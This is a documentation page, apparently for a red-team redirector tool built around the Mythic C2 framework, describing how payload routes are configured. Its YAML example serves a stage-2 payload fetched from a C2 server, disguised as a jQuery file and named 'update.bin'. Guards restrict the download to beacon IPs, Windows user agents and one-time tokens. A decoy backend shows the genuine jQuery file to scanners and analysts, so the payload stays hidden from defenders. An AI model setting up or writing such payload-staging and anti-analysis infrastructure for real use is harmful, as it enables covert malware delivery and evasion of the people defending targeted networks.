---
layout: default
title: Overview
parent: Payload Delivery
nav_order: 1
---

# Payload Delivery Overview

Payload routes are defined under `content_routes` in the domain config. Each route has an independent guard stack applied after the domain pipeline.

## Route Schema

```yaml
content_routes:
  - path: "/jquery-3.7.1.min.js"
    backend:
      type: "mythic_file"
      target: "https://${MYTHIC_IP}:7443"
      file_id: "${MYTHIC_STAGE2_FILE_ID}"
      ssl_verify: false
      headers:
        Content-Disposition: "attachment; filename=\"update.bin\""

    guard:
      require_beacon_ip: true
      allowed_user_agents:
        - "^Mozilla/5\\.0 \\(Windows NT"
        - "WinHTTP"
      required_headers:
        X-Requested-With: "XMLHttpRequest"
      forbidden_headers:
        - "Via"
        - "X-Forwarded-For"

    require_token: true
    rate_limit:
      enabled: true
      max_downloads: 1
      window_seconds: 3600

    conditional:
      score_threshold: 0.5
      scanner_backend:
        type: "http_proxy"
        target: "https://jquery.com/jquery-3.7.1.min.js"

    track: true
```

## Guard Stack

| Guard | Key | Effect |
|---|---|---|
| Beacon IP check | `require_beacon_ip: true` | Only whitelisted IPs can download |
| User-Agent filter | `allowed_user_agents` | Regex list; non-matching UAs blocked |
| Required headers | `required_headers` | All listed headers must match |
| Forbidden headers | `forbidden_headers` | Any listed header present = blocked |
| One-time token | `require_token: true` | Token must be present and unconsumed |
| Rate limiting | `rate_limit` | Max downloads per IP per window |

## Conditional (Decoy) Backend

When `conditional.scanner_backend` is set, requests that fail the guard serve the decoy backend instead of returning an error. Analysts get real content; beacons get the payload.
